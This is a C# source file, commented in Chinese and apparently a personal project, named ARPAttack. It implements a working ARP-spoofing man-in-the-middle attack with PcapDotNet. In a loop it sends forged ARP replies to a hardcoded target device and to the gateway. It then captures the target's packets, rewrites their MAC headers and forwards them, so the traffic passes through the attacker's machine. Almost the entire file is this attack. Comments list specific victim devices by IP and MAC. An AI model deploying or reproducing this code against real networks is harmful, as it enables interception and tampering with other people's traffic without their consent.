using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

using PcapDotNet.Base;
using PcapDotNet.Core;
using PcapDotNet.Core.Extensions;
using PcapDotNet.Packets;
using PcapDotNet.Packets.Arp;
using PcapDotNet.Packets.Dns;
using PcapDotNet.Packets.Ethernet;
using PcapDotNet.Packets.Gre;
using PcapDotNet.Packets.Http;
using PcapDotNet.Packets.Icmp;
using PcapDotNet.Packets.Igmp;
using PcapDotNet.Packets.IpV4;
using PcapDotNet.Packets.Transport;
using nettools;
using System.IO;
using System.Threading;
using System.Collections.ObjectModel;

namespace ARPAttack
{
	class Program
	{

		static void Main(string[] args)
		{
			//Retrieve the device list from the local machine
			var allDevices = LivePacketDevice.AllLocalMachine;

			if (allDevices.Count == 0)
			{
				Console.WriteLine("No interfaces found! Make sure WinPcap is installed.");
				return;
			}

			// Print the list
			for (int i = 0; i != allDevices.Count; ++i)
			{
				Console.WriteLine($"{i + 1}.{allDevices[i].GetMacAddress().ToString()} {allDevices[i].Description}");
			}
			// */
			int deviceIndex = 0;
			do
			{
				Console.WriteLine($"Enter the interface number (1-{ allDevices.Count }):");
				var deviceIndexString = Console.ReadLine();
				if (!int.TryParse(deviceIndexString, out deviceIndex) || deviceIndex < 1 || deviceIndex > allDevices.Count) deviceIndex = 0;
			} while (deviceIndex == 0);

			// Take the selected adapter
			var selectedDevice = allDevices[deviceIndex - 1];
			var ipv4s = (from item in selectedDevice.Addresses where item.Address.Family == SocketAddressFamily.Internet select item).ToArray();

			// Open the device
			// portion of the packet to capture
			// 65536 guarantees that the whole packet will be captured on all the link layers ,promiscuous mode ,read timeout
			using (var communicator = selectedDevice.Open(65536, PacketDeviceOpenAttributes.Promiscuous, 1000))
			{
				Console.WriteLine("Listening on " + selectedDevice.Description + "...");

				// Compile the filter, set the filter
				using (var filter = communicator.CreateFilter("ip")) communicator.SetFilter(filter);

				//要攻击的设备的信息 yoga
				//var targetip = "192.168.43.17";
				//var targetmac = "a4:34:d9:49:9a:b2";

				//要攻击的设备的信息 opi
				//var targetip = "192.168.43.179";
				//var targetmac = "16:a4:be:45:f8:8a".ToUpper();

				//要攻击的设备的信息 邹亮本子
				var targetip = "192.168.1.100";
				var targetmac = "16:a4:be:45:f8:8a".ToUpper();
				
				//网关的信息 我的zuk
				//var gatewayip = "192.168.43.1";
				//var gatewaymac = "d8:9a:34:2c:01:eb".ToUpper();

				//网关的信息
				var gatewayip = "192.168.1.1";
				var gatewaymac = "24:69:68:80:12:82".ToUpper();

				//通用转换
				var bs_targetmac = targetmac.MACToBytes();
				var bs_gatewaymac = gatewaymac.MACToBytes();
				
				//自己的信息
				var s_mac = selectedDevice.GetMacAddress().ToString().ToUpper();
				var bs_mac = s_mac.MACToBytes();
				var s_ipv4 = ipv4s.Length > 0 ? ipv4s[0].Address.ToString() : "192.168.1.201";
				var s_mask = ipv4s.Length > 0 ? ipv4s[0].Netmask.ToString() : "255.255.255.0";
				s_ipv4 = s_ipv4.Substring(s_ipv4.IndexOf(' ') + 1);
				s_mask = s_mask.Substring(s_mask.IndexOf(' ') + 1);

				var bs_ipv4 = s_ipv4.IPv4ToBytes();


				var bs_mask = s_mask.IPv4ToBytes();

				//局域网的广播地址
				var bs_brc2 = new byte[]{
					(byte)((byte)(bs_mask[0] ^ 0xFF) | bs_ipv4[0]),
					(byte)((byte)(bs_mask[1] ^ 0xFF) | bs_ipv4[1]),
					(byte)((byte)(bs_mask[2] ^ 0xFF) | bs_ipv4[2]),
					(byte)((byte)(bs_mask[3] ^ 0xFF) | bs_ipv4[3]),
				};

				//获得网段
				var bs_segment = new byte[]{
					(byte)(bs_mask[0] & bs_ipv4[0]),
					(byte)(bs_mask[1] & bs_ipv4[1]),
					(byte)(bs_mask[2] & bs_ipv4[2]),
					(byte)(bs_mask[3] & bs_ipv4[3]),
				};

				var segment_max = BitConverter.ToInt32(new[] { (byte)(bs_mask[3] ^ 0xFF), (byte)(bs_mask[2] ^ 0xFF), (byte)(bs_mask[1] ^ 0xFF), (byte)(bs_mask[0] ^ 0xFF) }, 0);
				var segment = BitConverter.ToInt32(bs_segment, 0);

				Task.Factory.StartNew(() =>
				{
					while (true)
					{
						var dnsresult = MakePacker.BuildArpPacket(selectedDevice.GetMacAddress().ToString(), gatewayip, targetmac, targetip, ArpOperation.Reply);
						communicator.SendPacket(dnsresult);
						dnsresult = MakePacker.BuildArpPacket(selectedDevice.GetMacAddress().ToString(), targetip, gatewaymac, gatewayip, ArpOperation.Reply);
						communicator.SendPacket(dnsresult);
						Thread.Sleep(50);
					}
				});
				// start the capture
				communicator.ReceivePackets(0, (packet) =>
				{
					//数据链路层-目标MAC
					var data_destination_mac = new byte[6];
					//数据链路层-源MAC
					var data_source_mac = new byte[6];
					//协议
					var protocol = new byte[2];
					//ip协议版本 0100b=ipv4 0110=ipv6
					byte version = 0;
					//ip头长度
					UInt16 headlenght = 0;

					/*
						PPP：定义包的优先级，取值越大数据越重要
							 000 普通 (Routine)
							 001 优先的 (Priority)
							 010 立即的发送 (Immediate)
							 011 闪电式的 (Flash)
							 100 比闪电还闪电式的 (Flash Override)
							 101 CRI/TIC/ECP(找不到这个词的翻译)
							 110 网间控制 (Internetwork Control)
							 111 网络控制 (Network Control)

						D 时延: 0:普通 1:延迟尽量小
						T 吞吐量: 0:普通 1:流量尽量大
						R 可靠性: 0:普通 1:可靠性尽量大
						M 传输成本: 0:普通 1:成本尽量小
						0 最后一位被保留，恒定为0
					 */
					byte servertype = 0;

					var buff = new MemoryStream(packet.Buffer);
					//获取目标MAC 源MAC 协议类型
					buff.Read(data_destination_mac, 0, 6);
					buff.Read(data_source_mac, 0, 6);
					buff.Read(protocol, 0, 2);
					if (protocol[0] != 8 || protocol[1] != 0)
					{
						//并不是IP协议
						return;
					}

					//判断目标MAC是不是自己
					if (data_destination_mac.BytesToMAC() != s_mac) return;

					//判断源MAC是不是自己
					if (data_source_mac.BytesToMAC() == s_mac) return;

					//获取协议版本和头长度
					version = (byte)buff.ReadByte();
					headlenght = (UInt16)((version & 0xF) * 4);//IP头最大长度为60字节,最小为20字节
					version = (byte)(version >> 4);

					//获取服务类型   1
					servertype = (byte)buff.ReadByte();

					//读取数据包总长度   2
					var totallenght = buff.ReadInt16();
					//标识符   2
					/*
					 * 该字段和Flags和Fragment Offest字段联合使用，对较大的上层数据包进行分段（fragment）操作。路由器将一个包拆分后，所有拆分开的小包被标记相同的值，以便目的端设备能够区分哪个包属于被拆分开的包的一部分。
					 */
					var identifier = buff.ReadInt16();

					//Flags和Fragment Offest  2
					var flagandfragment = buff.ReadInt16();

					//生存时间   1
					var ttl = buff.ReadByte();

					//IP层协议 1:ICMP 2:IGMP 6:TCP 17:UDP 88:IGRP 89:OSPF   1
					var ipprotocol = buff.ReadByte();

					//头部校验数字,如果改变TTL的话,这个也要跟着改   2
					var headchecksum = buff.ReadInt16();

					//源IP   4
					var i_sourceip = buff.ReadInt32();

					//目标IP   4
					var i_destinationip = buff.ReadInt32();

					var s_destinationip = BitConverter.GetBytes(i_destinationip).BytesToIPv4();
					//判断源MAC是不是被ARP攻击的设备 以及这个包是否给自己的
					if (data_source_mac.BytesToMAC() == targetmac && s_destinationip != s_ipv4)
					{
						var newbuff = packet.Buffer;
						newbuff[0] = bs_gatewaymac[0];
						newbuff[1] = bs_gatewaymac[1];
						newbuff[2] = bs_gatewaymac[2];
						newbuff[3] = bs_gatewaymac[3];
						newbuff[4] = bs_gatewaymac[4];
						newbuff[5] = bs_gatewaymac[5];
						newbuff[6] = bs_mac[0];
						newbuff[7] = bs_mac[1];
						newbuff[8] = bs_mac[2];
						newbuff[9] = bs_mac[3];
						newbuff[10] = bs_mac[4];
						newbuff[11] = bs_mac[5];
						communicator.SendPacket(new Packet(newbuff, DateTime.Now, DataLinkKind.Ethernet));
						return;
					}

					//判断源MAC是不是网关
					if (data_source_mac.BytesToMAC() == gatewaymac && s_destinationip == targetip)
					{
						var newbuff = packet.Buffer;
						newbuff[0] = bs_targetmac[0];
						newbuff[1] = bs_targetmac[1];
						newbuff[2] = bs_targetmac[2];
						newbuff[3] = bs_targetmac[3];
						newbuff[4] = bs_targetmac[4];
						newbuff[5] = bs_targetmac[5];
						newbuff[6] = bs_mac[0];
						newbuff[7] = bs_mac[1];
						newbuff[8] = bs_mac[2];
						newbuff[9] = bs_mac[3];
						newbuff[10] = bs_mac[4];
						newbuff[11] = bs_mac[5];
						communicator.SendPacket(new Packet(newbuff, DateTime.Now, DataLinkKind.Ethernet));
						return;
					}

					//一个很尴尬的情况,ARP攻击到自己头上了..
					if (data_source_mac.BytesToMAC() == s_mac && s_destinationip != s_ipv4)
					{
						var newbuff = packet.Buffer;
						newbuff[0] = bs_gatewaymac[0];
						newbuff[1] = bs_gatewaymac[1];
						newbuff[2] = bs_gatewaymac[2];
						newbuff[3] = bs_gatewaymac[3];
						newbuff[4] = bs_gatewaymac[4];
						newbuff[5] = bs_gatewaymac[5];
						communicator.SendPacket(new Packet(newbuff, DateTime.Now, DataLinkKind.Ethernet));
						return;
					}


				});
			}//End Using
		}//End Main
	}//End Class
}
